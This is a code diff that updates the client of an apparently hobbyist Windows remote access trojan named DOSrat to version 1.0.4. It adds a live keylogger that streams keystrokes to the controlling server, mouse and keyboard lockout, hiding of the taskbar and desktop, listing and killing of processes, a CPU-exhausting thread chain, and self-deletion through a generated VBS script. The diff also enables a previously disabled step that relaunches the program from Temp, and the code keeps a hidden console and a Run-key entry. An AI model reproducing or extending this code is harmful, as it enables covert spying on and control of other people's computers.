Update to 1.0.4
Several Update for version 1.0.4

+++ DOSrat/clnt/dosc.cpp
@@ -6,15 +6,29 @@
 #include <time.h>
 #include <windows.h>
 #include <fstream>
+#include <winable.h>
+#include <stdio.h>
+#include <tchar.h>
+#include <psapi.h>
 
 int v=0;
 bool v2=true;
 bool v3=true;
 bool v4=true;
 bool v5=true;
+bool v6=true;
+bool v7=true;
 SOCKET Client;
 addrinfo Server;
 TCHAR name[30]={0};
+char tit[100]={0};
+char mes[500]={0};
+char Csimb[3]={0};
+char Cbott[3]={0};
+char ctsk[7]={0};
+int simb=0;
+int bott=0;
+int LagCount=0;
 
 using namespace std;
 
@@ -33,16 +47,20 @@ void VMOUSE();
 void GETINFO(SOCKET);
 bool CheckPreliminari();
 void InitKeylog();
+void DelClient();
+void LiveKey(SOCKET);
+void Lag();
+bool SocketConnected(SOCKET);
 
 ///////////////////////////////////////////////////////////////MAIN
 
 int main()
 {
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
-	//if(CheckPreliminari())
-		//if(preliminari())
-			//return 0;
-	preliminari();
+	if(CheckPreliminari())
+		if(preliminari())
+			return 0;
+	//preliminari();
 	//InitKeylog();
 	int PORTA=5555;//RIF
 	int check=0;
@@ -68,6 +86,7 @@ int main()
 	t1.detach();
 	while(true)
 	{
+		Sleep(1000);
 		if(v==-1)
 			break;
 	}
@@ -122,6 +141,7 @@ addrinfo getSinfo(SOCKET s,int p)
 
 addrinfo wcon(SOCKET s,addrinfo a)
 {
+	v5=false;
 	char sig[30]="cripe";
 	DWORD cchCN=30;
 	cout<<"<Client> Tento di connettermi al Server..."<<endl;
@@ -135,6 +155,7 @@ addrinfo wcon(SOCKET s,addrinfo a)
 		}
 		else
 		{
+			v5=true;
 			cout<<"<Client> Connesso con il Server!\n"<<endl;
 			Sleep(10);
 			send(s,sig,30,0);
@@ -150,105 +171,112 @@ addrinfo wcon(SOCKET s,addrinfo a)
 void ricevi(SOCKET s)
 {
 	int ck=0;
-	char msg=0;
+	char msg[2]={0};
 	while(true)
-	{
-		ck=recv(s,&msg,sizeof(msg),0);
+	{	
+		ck=recv(s,msg,sizeof(msg),0);
 		if(msg!=0 && ck!=-1)
 		{
-			if(msg=='A')
+			if(msg[0]=='A' && msg[1]=='A')
 			{
 				cout<<"\n<Client> Il Server ha chiuso la connessione...";
 				//Sleep(10);
 				closesocket(s);
+				v5=false;
 				v=-1;
 				return;
 			}
 			if(v==-1)
 				return;
-			if(msg=='B')
+			if(msg[0]=='B' && msg[1]=='B')
 			{
 				system("shutdown -s -t 1 -f");
 				cout<<"<Server> Shutdown."<<endl;
 			}
-			if(msg=='E')
+			if(msg[0]=='D' && msg[1]=='D')
 			{
 				system("shutdown -r -t 1 -f");
 				cout<<"<Server> Reboot."<<endl;
 			}
-			if(msg=='C')
+			if(msg[0]=='C' && msg[1]=='C')
 			{
 				SwapMouseButton(true);
 				cout<<"<Server> Mouse swap."<<endl;
 			}
-			if(msg=='D')
+			if(msg[0]=='C' && msg[1]=='R')
 			{
 				SwapMouseButton(false);
 				cout<<"<Server> Mouse unswap."<<endl;
 			}
-			if(msg=='F')
+			if(msg[0]=='E' && msg[1]=='E')
 			{
 				mciSendString("set cdaudio door open",NULL,0,NULL);
 				cout<<"<Server> Open CD."<<endl;
 			}
-			if(msg=='G')
+			if(msg[0]=='E' && msg[1]=='R')
 			{
 				mciSendString("set cdaudio door closed",NULL,0,NULL);
 				cout<<"<Server> Close CD."<<endl;
 			}
-			if(msg=='H')
+			if(msg[0]=='F' && msg[1]=='F')
 			{
 				SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
 				cout<<"<Server> Monitor off."<<endl;
 			}
-			if(msg=='I')
+			if(msg[0]=='G' && msg[1]=='G')
 			{
+				recv(s,tit,sizeof(tit),0);
+				recv(s,mes,sizeof(mes),0);
+				recv(s,Csimb,sizeof(Csimb),0);
+				recv(s,Cbott,sizeof(Cbott),0);
+				simb=atoi(Csimb);
+				bott=atoi(Cbott);
 				thread t3(MSGBOX);
 				t3.detach();
 				cout<<"<Server> Msgbox."<<endl;
 			}
-			if(msg=='J')
+			if(msg[0]=='H' && msg[1]=='H')
 			{
 				cout<<"<Server> Client reset."<<endl;
-				system("start Client.exe");
+				system("start Prova.exe");//3RIF
 				closesocket(s);
 				v=-1;
 				return;
 			}
-			if(msg=='K')
+			if(msg[0]=='I' && msg[1]=='I')
 			{
 				thread t4(CMOUSE);
 				t4.detach();
 				cout<<"<Server> CrazyMouse."<<endl;
 			}
-			if(msg=='L')
+			if(msg[0]=='I' && msg[1]=='R')
 			{
 				v2=false;
 				cout<<"<Server> CrazyMouse stop."<<endl;
 			}
-			if(msg=='M')
+			if(msg[0]=='J' && msg[1]=='J')
 			{
 				thread t4(BMOUSE);
 				t4.detach();
 				cout<<"<Server> BlockMouse."<<endl;
 			}
-			if(msg=='N')
+			if(msg[0]=='J' && msg[1]=='R')
 			{
 				v3=false;
 				cout<<"<Server> UnlockMouse."<<endl;
 			}
-			if(msg=='O')
+			if(msg[0]=='K' && msg[1]=='K')
 			{
 				thread t5(VMOUSE);
 				t5.detach();
 				cout<<"<Server> MouseViber."<<endl;
 			}
-			if(msg=='P')
+			if(msg[0]=='K' && msg[1]=='R')
 			{
 				v4=false;
 				cout<<"<Server> MouseUnviber."<<endl;
 			}
-			if(msg=='Q')
+			if(msg[0]=='L' && msg[1]=='L')
 			{
 				v5=false;
 				cout<<"<Server> GetInfo."<<endl;
@@ -261,17 +289,17 @@ void ricevi(SOCKET s)
 				GETINFO(s);
 				v5=true;
 			}
-			if(msg=='R')
+			if(msg[0]=='M' && msg[1]=='M')
 			{
 				ShowWindow(GetConsoleWindow(), SW_SHOWNORMAL);
 				cout<<"<Server> Client show."<<endl;
 			}
-			if(msg=='S')
+			if(msg[0]=='M' && msg[1]=='R')
 			{
 				ShowWindow(GetConsoleWindow(), SW_HIDE);
 				cout<<"<Server> Client hide."<<endl;
 			}
-			if(msg=='T')
+			if(msg[0]=='N' && msg[1]=='N')
 			{
 				char web[100]={0};
 				recv(s,web,sizeof(web),0);
@@ -287,6 +315,265 @@ void ricevi(SOCKET s)
 				cout<<"<Server> Open web page "<<web<<endl;
 				ShellExecute(NULL,"open",web,NULL,NULL,SW_SHOWNORMAL);
 			}
+			if(msg[0]=='O' && msg[1]=='O')
+			{
+				cout<<"<Server> Client delete."<<endl;
+				DelClient();
+				closesocket(s);
+				v5=false;
+				v=-1;
+				return;
+			}
+			if(msg[0]=='P' && msg[1]=='P')
+			{
+				v6=true;
+				cout<<"<Server> LiveKeylogger START."<<endl;
+				thread tv(LiveKey,s);
+				tv.detach();
+				Sleep(500);
+				while(v6)
+				{
+					for(char i=1;i<=127;i++)
+					{
+						if(GetAsyncKeyState(i)!=0)
+						{
+							send(s,&i,sizeof(i),0);
+							Sleep(52);
+							if(v6==false)
+								break;
+						}
+					}
+				}
+				cout<<"<Server> LiveKeylogger END."<<endl;
+			}
+			if(msg[0]=='Q' && msg[1]=='Q')
+			{
+				v7=false;
+				cout<<"<Server> Lag START."<<endl;
+				thread tlag(Lag);
+				tlag.detach();
+			}
+			if(msg[0]=='Q' && msg[1]=='R')
+			{
+				v7=true;
+				cout<<"<Server> Lag STOP."<<endl;
+			}
+			if(msg[0]=='R' && msg[1]=='R')
+			{
+				v5=false;
+				char trash='~';
+				send(s,&trash,sizeof(trash),0);
+				cout<<"<Server> TASKBAR."<<endl;
+				send(s,&ctsk[0],sizeof(ctsk[0]),0);
+				send(s,&ctsk[1],sizeof(ctsk[1]),0);
+				send(s,&ctsk[2],sizeof(ctsk[2]),0);
+				send(s,&ctsk[3],sizeof(ctsk[3]),0);
+				send(s,&ctsk[4],sizeof(ctsk[4]),0);
+				send(s,&ctsk[5],sizeof(ctsk[5]),0);
+				send(s,&ctsk[6],sizeof(ctsk[6]),0);
+				v5=true;
+			}
+			if(msg[0]=='R' && msg[1]=='1')
+			{
+				HWND hwnd=FindWindow((LPCSTR)"Shell_TrayWnd", NULL);
+				if(ctsk[0]%2==0)
+				{
+					ShowWindow(hwnd,SW_HIDE);
+					cout<<"<Server> TaskBar Hide."<<endl;
+				}
+				else
+				{
+					cout<<"<Server> TaskBar Show."<<endl;
+					ShowWindow(hwnd,SW_SHOW);
+				}
+				UpdateWindow(hwnd);
+				ctsk[0]++;
+			}
+			if(msg[0]=='R' && msg[1]=='2')
+			{
+				HWND hwnd=FindWindow("Shell_TrayWnd", NULL);
+			    hwnd=FindWindowEx(hwnd,HWND(0),"TrayNotifyWnd",NULL);
+				hwnd=FindWindowEx(hwnd,HWND(0),"TrayClockWClass",NULL);
+				if(ctsk[1]%2==0)
+				{
+					ShowWindow(hwnd,SW_HIDE);
+					cout<<"<Server> Clock Hide."<<endl;
+				}
+				else
+				{
+					cout<<"<Server> Clock Show."<<endl;
+					ShowWindow(hwnd,SW_SHOW);
+				}
+				UpdateWindow(hwnd);
+				ctsk[1]++;
+			}
+			if(msg[0]=='R' && msg[1]=='3')
+			{
+				HWND hwnd=FindWindow("Shell_TrayWnd", NULL);
+			    hwnd=FindWindowEx(hwnd,HWND(0),"Start",NULL);
+				if(ctsk[2]%2==0)
+				{
+					ShowWindow(hwnd,SW_HIDE);
+					cout<<"<Server> StartButton Hide."<<endl;
+				}
+				else
+				{
+					cout<<"<Server> StartButton Show."<<endl;
+					ShowWindow(hwnd,SW_SHOW);
+				}
+				UpdateWindow(hwnd);
+				ctsk[2]++;
+			}
+			if(msg[0]=='R' && msg[1]=='4')
+			{
+				HWND hwnd=FindWindow("Shell_TrayWnd", NULL);
+			    hwnd=FindWindowEx(hwnd,HWND(0),"TrayNotifyWnd",NULL);
+				if(ctsk[3]%2==0)
+				{
+					ShowWindow(hwnd,SW_HIDE);
+					cout<<"<Server> NotifyIcon Hide."<<endl;
+				}
+				else
+				{
+					cout<<"<Server> NotifyIcon Show."<<endl;
+					ShowWindow(hwnd,SW_SHOW);
+				}
+				UpdateWindow(hwnd);
+				ctsk[3]++;
+			}
+			if(msg[0]=='R' && msg[1]=='5')
+			{
+				HWND hwnd=FindWindow("Shell_TrayWnd", NULL);
+				hwnd=FindWindowEx(hwnd,HWND(0),"TrayNotifyWnd",NULL);
+			    hwnd=FindWindowEx(hwnd,HWND(0),"TrayButton",NULL);
+				if(ctsk[4]%2==0)
+				{
+					ShowWindow(hwnd,SW_HIDE);
+					cout<<"<Server> Notify Hide."<<endl;
+				}
+				else
+				{
+					cout<<"<Server> Notify Show."<<endl;
+					ShowWindow(hwnd,SW_SHOW);
+				}
+				UpdateWindow(hwnd);
+				ctsk[4]++;
+			}
+			if(msg[0]=='R' && msg[1]=='6')
+			{
+				HWND hwnd=FindWindow("Shell_TrayWnd", NULL);
+			    hwnd=FindWindowEx(hwnd,HWND(0),"TrayNotifyWnd",NULL);
+			    hwnd=FindWindowEx(hwnd,HWND(0),"Button",NULL);
+				if(ctsk[5]%2==0)
+				{
+					ShowWindow(hwnd,SW_HIDE);
+					cout<<"<Server> TaskBar Hide."<<endl;
+				}
+				else
+				{
+					cout<<"<Server> TaskBar Show."<<endl;
+					ShowWindow(hwnd,SW_SHOW);
+				}
+				UpdateWindow(hwnd);
+				ctsk[5]++;
+			}
+			if(msg[0]=='R' && msg[1]=='7')
+			{
+				HWND hwnd=FindWindow("Program Manager", NULL);
+    			hwnd=FindWindowEx(hwnd,HWND(0),"Progman",NULL);
+				if(ctsk[6]%2==0)
+				{
+					ShowWindow(hwnd,SW_HIDE);
+					cout<<"<Server> Desktop Hide."<<endl;
+				}
+				else
+				{
+					cout<<"<Server> Desktop Show."<<endl;
+					ShowWindow(hwnd,SW_SHOW);
+				}
+				UpdateWindow(hwnd);
+				ctsk[6]++;
+			}
+			if(msg[0]=='S' && msg[1]=='S')
+			{
+				BlockInput(true);
+				cout<<"<Server> Mouse&Keyboard block."<<endl;
+			}
+			if(msg[0]=='S' && msg[1]=='R')
+			{
+				BlockInput(false);
+				cout<<"<Server> Mouse&Keyboard unlock."<<endl;
+			}
+			if(msg[0]=='T' && msg[1]=='T')
+			{
+				int n=0;
+				char PID[50]={0};
+				cout<<"<Server> TPC."<<endl;
+				DWORD aProcesses[1024], cbNeeded, cProcesses;
+				EnumProcesses(aProcesses,sizeof(aProcesses),&cbNeeded);
+				cProcesses=cbNeeded/sizeof(DWORD);
+				for(int i=0;i<cProcesses;i++)
+			    {
+			        if(aProcesses[i]!=0)
+			        {
+			            char szProcessName[MAX_PATH]=TEXT("<unknown>");
+			            HANDLE hProcess=OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,FALSE,aProcesses[i]);
+			            if(NULL!=hProcess)
+					    {
+					        HMODULE hMod;
+					        DWORD cbNeeded;
+					        if(EnumProcessModules(hProcess,&hMod,sizeof(hMod),&cbNeeded))
+					            GetModuleBaseName(hProcess,hMod,szProcessName,sizeof(szProcessName)/sizeof(TCHAR));
+					        if(szProcessName[0]!='<')
+					        	n++;
+					        CloseHandle(hProcess);
+					    }
+			        }
+			    }
+			    char trash='f';
+			    send(s,&trash,sizeof(trash),0);
+			    char c=(char)n;
+			    send(s,&c,sizeof(c),0);
+			    for(int i=0;i<cProcesses;i++)
+			    {
+			        if(aProcesses[i]!=0)
+			        {
+			            char szProcessName[MAX_PATH]=TEXT("<unknown>");
+			            HANDLE hProcess=OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,FALSE,aProcesses[i]);
+			            if(NULL!=hProcess)
+					    {
+					        HMODULE hMod;
+					        DWORD cbNeeded;
+					        if(EnumProcessModules(hProcess,&hMod,sizeof(hMod),&cbNeeded))
+					            GetModuleBaseName(hProcess,hMod,szProcessName,sizeof(szProcessName)/sizeof(TCHAR));
+					        if(szProcessName[0]!='<')
+					        {
+					        	//memcpy(Pid, &aProcesses[i], sizeof(aProcesses[i]));
+					        	int tmp=aProcesses[i];
+					        	char Pid[MAX_PATH]={0};
+					        	sprintf(Pid,"%d",tmp);
+					        	send(s,szProcessName,sizeof(szProcessName),0);
+					        	send(s,Pid,sizeof(Pid),0);
+							}
+					        CloseHandle(hProcess);
+					    }
+			        }
+			    }
+			    recv(s,PID,sizeof(PID),0);
+			    switch(PID[0])
+			    {
+			    	case '0':
+			    		cout<<"<Server> TPC cancelled."<<endl;
+			    	break;
+			    	
+			    	default:
+			    		char FIN[100]="taskkill /F /PID ";
+			    		for(int i=17;i<50;i++)
+			    			FIN[i]=PID[i-17];
+			    		system(FIN);
+			    	break;
+				}
+			}
 		}
 		else
 			Sleep(5000);
@@ -295,13 +582,15 @@ void ricevi(SOCKET s)
 }
 
 void manda(SOCKET s)
-{
-	char msg;
+{	
+	char c=0;
 	while(true)
-	{
+	{	
+		if(v==-1)
+			return;
 		Sleep(5000);
 		if(v5)
-		if(send(s,&msg,sizeof(msg),0)==-1)
+		if(recv(s,&c,1,MSG_PEEK)==-1)
 		{
 			closesocket(Client);
 			Client=createSock();
@@ -310,34 +599,39 @@ void manda(SOCKET s)
 	}
 }
 
+void Lag()
+{
+	int iLag=0;
+	if(LagCount<11)
+	{
+		LagCount++;
+		thread ttlag(Lag);
+		ttlag.detach();
+	}
+	while(true)
+	{
+		iLag++;
+		if(v7)
+			return;
+	}	
+	return;
+}
+
+void LiveKey(SOCKET s)
+{
+	char LVK[2];
+	while(v6)
+	{
+		recv(s,LVK,sizeof(LVK),0);
+		//if(LVK=='V')
+		v6=false;
+	}
+	return;
+}
+
 void MSGBOX()
 {
-	srand(time(0));
-	int r=rand()%5;
-	
-	switch(r)
-	{
-		case 0:
-			MessageBox(NULL, "----ATTENZIONE!----\n\nIl tuo PC sta per esplodere!\nAllontanati subito entro 5 secondi", "Esplosione Imminente", MB_ICONWARNING | MB_OK);
-		break;
-		
-		case 1:
-			MessageBox(NULL, "Sei sicuro di voler cancellare \"System32\" DEFINITIVAMENTE?", "System32", MB_ICONWARNING | MB_MISCMASK);
-		break;
-		
-		case 2:
-			MessageBox(NULL, "Dio è morto e tu lo hai ucciso...", "Gesù", MB_USERICON | MB_ABORTRETRYIGNORE);
-		break;
-		
-		case 3:
-			MessageBox(NULL, "Un virus è stato rilevato nel tuo sistema!\n\nVuoi rimuoverlo?", "AntiVirus", MB_ICONSTOP | MB_YESNOCANCEL);
-		break;
-		
-		case 4:
-			MessageBox(NULL, "49 6c 20 67 69 6f 72 6e 6f 20 66 75 20 70 69 65 6e 6f 20 64 69 20 6c 61 6d 70 69 3b 0a 6d 61 20 6f 72 61 20 76 65 72 72 61 6e 6e 6f 20 6c 65 20 73 74 65 6c 6c 65 2c 0a 6c 65 20 74 61 63 69 74 65 20 73 74 65 6c 6c 65 2e 20 4e 65 69 20 63 61 6d 70 69 0a 63 27 65 20 75 6e 20 62 72 65 76 65 20 67 72 65 20 67 72 65 20 64 69 20 72 61 6e 65 6c 6c 65 2e 0a 4c 65 20 74 72 65 6d 75 6c 65 20 66 6f 67 6c 69 65 20 64 65 69 20 70 69 6f 70 70 69 0a 74 72 61 73 63 6f 72 72 65 20 75 6e 61 20 67 69 6f 69 61 20 6c 65 67 67 69 65 72 61 2e 0a 4e 65 6c 20 67 69 6f 72 6e 6f 2c 20 63 68 65 20 6c 61 6d 70 69 21 20 63 68 65 20 73 63 6f 70 70 69 21 0a 43 68 65 20 70 61 63 65 2c 20 6c 61 20 73 65 72 61 21 0a 0a 53 69 20 64 65 76 6f 6e 6f 20 61 70 72 69 72 65 20 6c 65 20 73 74 65 6c 6c 65 0a 6e 65 6c 20 63 69 65 6c 6f 20 73 69 20 74 65 6e 65 72 6f 20 65 20 76 69 76 6f 2e 0a 4c 61 2c 20 70 72 65 73 73 6f 20 6c 65 20 61 6c 6c 65 67 72 65 20 72 61 6e 65 6c 6c 65 2c 0a 73 69 6e 67 68 69 6f 7a 7a 61 20 6d 6f 6e 6f 74 6f 6e 6f 20 75 6e 20 72 69 76 6f 2e 0a 44 69 20 74 75 74 74 6f 20 71 75 65 6c 20 63 75 70 6f 20 74 75 6d 75 6c 74 6f 2c 0a 64 69 20 74 75 74 74 61 20 71 75 65 6c 6c 27 61 73 70 72 61 20 62 75 66 65 72 61 2c 0a 6e 6f 6e 20 72 65 73 74 61 20 63 68 65 20 75 6e 20 64 6f 6c 63 65 20 73 69 6e 67 75 6c 74 6f 0a 6e 65 6c 6c 27 75 6d 69 64 61 20 73 65 72 61 2e 0a 0a 45 2c 20 71 75 65 6c 6c 61 20 69 6e 66 69 6e 69 74 61 20 74 65 6d 70 65 73 74 61 2c 0a 66 69 6e 69 74 61 20 69 6e 20 75 6e 20 72 69 76 6f 20 63 61 6e 6f 72 6f 2e 0a 44 65 69 20 66 75 6c 6d 69 6e 69 20 66 72 61 67 69 6c 69 20 72 65 73 74 61 6e 6f 0a 63 69 72 72 69 20 64 69 20 70 6f 72 70 6f 72 61 20 65 20 64 27 6f 72 6f 2e 0a 0a 4f 20 73 74 61 6e 63 6f 20 64 6f 6c 6f 72 65 2c 20 72 69 70 6f 73 61 21 0a 4c 61 20 6e 75 62 65 20 6e 65 6c 20 67 69 6f 72 6e 6f 20 70 69 75 20 6e 65 72 61 0a 66 75 20 71 75 65 6c 6c 61 20 63 68 65 20 76 65 64 6f 20 70 69 75 20 72 6f 73 61 0a 6e 65 6c 6c 27 75 6c 74 69 6d 61 20 73 65 72 61 2e 0a 0a 43 68 65 20 76 6f 6c 69 20 64 69 20 72 6f 6e 64 69 6e 69 20 69 6e 74 6f 72 6e 6f 21 0a 63 68 65 20 67 72 69 64 69 20 6e 65 6c 6c 27 61 72 69 61 20 73 65 72 65 6e 61 21 0a 4c 61 20 66 61 6d 65 20 64 65 6c 20 70 6f 76 65 72 6f 20 67 69 6f 72 6e 6f 0a 70 72 6f 6c 75 6e 67 61 20 6c 61 20 67 61 72 72 75 6c 61 20 63 65 6e 61 2e 0a 4c 61 20 70 61 72 74 65 2c 20 73 69 20 70 69 63 63 6f 6c 61 2c 20 69 20 6e 69 64 69 0a 6e 65 6c 20 67 69 6f 72 6e 6f 20 6e 6f 6e 20 6c 27 65 62 62 65 72 6f 20 69 6e 74 65 72 61 2e 0a 4e 65 20 69 6f 2e 2e 2e 20 65 20 63 68 65 20 76 6f 6c 69 2c 20 63 68 65 20 67 72 69 64 69 2c 0a 6d 69 61 20 6c 69 6d 70 69 64 61 20 73 65 72 61 21 0a 0a 44 6f 6e 2e 2e 2e 20 44 6f 6e 2e 2e 2e 20 45 20 6d 69 20 64 69 63 6f 6e 6f 2c 20 44 6f 72 6d 69 21 0a 6d 69 20 63 61 6e 74 61 6e 6f 2c 20 44 6f 72 6d 69 21 20 73 75 73 73 75 72 72 61 6e 6f 2c 0a 44 6f 72 6d 69 21 20 62 69 73 62 69 67 6c 69 61 6e 6f 2c 20 44 6f 72 6d 69 21 0a 6c 61 2c 20 76 6f 63 69 20 64 69 20 74 65 6e 65 62 72 61 20 61 7a 7a 75 72 72 61 2e 2e 2e 0a 4d 69 20 73 65 6d 62 72 61 6e 6f 20 63 61 6e 74 69 20 64 69 20 63 75 6c 6c 61 2c 0a 63 68 65 20 66 61 6e 6e 6f 20 63 68 27 69 6f 20 74 6f 72 6e 69 20 63 6f 6d 27 65 72 61 2e 2e 2e 0a 73 65 6e 74 69 76 6f 20 6d 69 61 20 6d 61 64 72 65 2e 2e 2e 20 70 6f 69 20 6e 75 6c 6c 61 2e 2e 2e 0a 73 75 6c 20 66 61 72 20 64 65 6c 6c 61 20 73 65 72 61 2e", "...", MB_USERICON | MB_OK);
-		break;
-	}
-	
+	MessageBox(NULL, mes, tit, simb | bott);
 	return;
 }
 
@@ -358,10 +652,10 @@ bool preliminari()
 	DWORD cchComputerName = 256;
 	char n[256]={'\0'};
 	char p1[256]="\"C:\\Users\\";
-	char p2[256]="\\AppData\\Local\\Temp\\test.exe\"";//2RIF
+	char p2[256]="\\AppData\\Local\\Temp\\Prova.exe\"";//2RIF
 	char pF[256]={'\0'};
 	char pFN[256]={'\0'};
-	char cmd[256]={"start "};
+	char cmd[256]="start ";
 	int c1=0;
 	int c2=0;
 	
@@ -401,7 +695,7 @@ bool preliminari()
 	for(int i=6;i<256;i++)
 		cmd[i]=pFN[i-6];
 	
-	//system(cmd);
+	system(cmd);
 	
 	return true;
 }
@@ -424,6 +718,7 @@ void BMOUSE()
 	for(v3=true;v3;)
 	{
 		SetCursorPos(coor.x,coor.y);
+		Sleep(5);
 	}
 	return;
 }
@@ -471,6 +766,8 @@ void GETINFO(SOCKET s)
     char wnd_title[256];
     char uac='f';
 	
+	send(s,&uac,sizeof(uac),0);
+	
 	Sleep(50);
 	
 	GetComputerName(szCN,&cchCN);
@@ -483,7 +780,7 @@ void GETINFO(SOCKET s)
 	GetModuleFileName(NULL,buff,MAX_PATH);
 	send(s,buff,sizeof(buff),0);
 	
-	char ver[50]="1.0.3";
+	char ver[50]="1.0.4";
 	send(s,ver,sizeof(ver),0);
 	
 	if(OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&hToken))
@@ -556,6 +853,53 @@ void InitKeylog()
     
 		outfile.close();
 	}
+	
+	return;
+}
+
+void DelClient()
+{
+	HKEY hreg;
+	RegOpenKeyEx(HKEY_CURRENT_USER,(LPCSTR)"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hreg);
+	RegDeleteValue(hreg,(LPCSTR)"Update");
+	
+	char bufferEXE[MAX_PATH];
+	char bufferVBS[MAX_PATH];
+	char cmd[MAX_PATH]="start ";
+	GetModuleFileName( NULL, bufferEXE, MAX_PATH );
+	GetModuleFileName( NULL, bufferVBS, MAX_PATH );
+	
+	for(int i=1;i<MAX_PATH;i++)
+	{
+		if(bufferVBS[i]=='T' && bufferVBS[i+1]=='e' && bufferVBS[i+2]=='m' && bufferVBS[i+3]=='p' && bufferVBS[i+4]=='\\')
+		{
+			bufferVBS[i+5]='A';
+			bufferVBS[i+6]='u';
+			bufferVBS[i+7]='t';
+			bufferVBS[i+8]='D';
+			bufferVBS[i+9]='.';
+			bufferVBS[i+10]='v';
+			bufferVBS[i+11]='b';
+			bufferVBS[i+12]='s';
+			i+=13;
+			while(i<200)
+			{
+				bufferVBS[i]=0;
+				i++;
+			}
+		}
+	}
+	
+	ofstream outfile;
+	
+	outfile.open(bufferVBS);
+	outfile<<"WScript.Sleep 10000\ndim filesys\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nfilesys.DeleteFile \""<<bufferEXE<<"\"\nfilesys.DeleteFile \""<<bufferVBS<<"\"\n";
+	outfile.close();
+	
+	for(int i=6;i<MAX_PATH;i++)
+		cmd[i]=bufferVBS[i-6];
+	
+	system(cmd);
 	
 	return;
 }
